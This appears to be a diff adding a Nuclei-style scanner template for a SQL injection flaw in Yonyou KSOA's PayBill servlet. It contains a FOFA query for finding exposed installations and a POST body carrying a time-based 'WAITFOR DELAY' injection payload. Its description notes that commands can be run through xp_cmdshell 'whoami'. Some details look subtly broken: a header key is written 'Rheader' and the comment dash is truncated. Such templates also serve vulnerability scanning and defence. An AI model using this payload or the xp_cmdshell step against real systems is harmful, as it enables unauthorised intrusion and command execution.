@@ -1,0 +1,42 @@
+id: 用友时空KSOA PayBill SQL注入漏洞 
+time: '2023-06-08'
+
+
+info:
+  name: 用友时空KSOA PayBill SQL注入漏洞 
+  severity: high
+  description: 用友时空KSOA PayBill SQL注入漏洞 ,可进行命令执行  exec master..xp_cmdshell 'whoami';
+  reference: 暂无
+  metadata:
+    max-request: 2
+    verified: true
+    fofa: app="用友-时空KSOA"
+  
+http:
+  - method: 
+      - POST
+    path:
+      - "{{BaseURL}}/servlet/PayBill?caculate&_rnd="
+
+    
+    Rheader:
+      - Accept-Encoding:gzip, deflate
+        
+    body: 
+      - |
+        <?xml version="1.0" encoding="UTF-8" ?><root><name>1</name><name>1'WAITFOR DELAY '00:00:03';-</name><name>1</name><name>102360</name></root>
+        
+
+      
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<errmsg>"
+
+      - type: status
+        status:
+          - 200
+    
